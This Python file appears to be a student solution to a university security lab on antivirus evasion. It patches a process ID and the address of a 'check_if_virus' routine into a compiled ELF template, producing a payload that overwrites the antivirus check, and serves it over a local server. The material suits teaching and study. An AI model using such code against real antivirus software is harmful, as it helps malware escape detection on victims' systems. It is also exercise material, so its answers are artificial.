import addresses
import evasion
import struct

from infosec.utils import assemble


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the check_if_virus code.

        Notes:
        1. You can assume we already compiled q2.c into q2.template.
        2. Use addresses.CHECK_IF_VIRUS_CODE (and addresses.address_to_bytes).
        3. If needed, you can use infosec.utils.assemble.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q2.template'
        with open(PATH_TO_TEMPLATE, 'rb') as reader:
            q2_elf = bytearray(reader.read())
        
        offset_pid = 4104
        pid_lit_en = struct.pack("<I", pid)
        for i in range(len(pid_lit_en)):
            q2_elf[offset_pid + i ] = pid_lit_en[i]
        
        addr = struct.pack("<I", addresses.CHECK_IF_VIRUS_CODE)
        check_if_virus_addr_offset = 4108
        for i in range(len(addr)):
            q2_elf[check_if_virus_addr_offset + i ] = addr[i]

        return bytes(q2_elf)

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
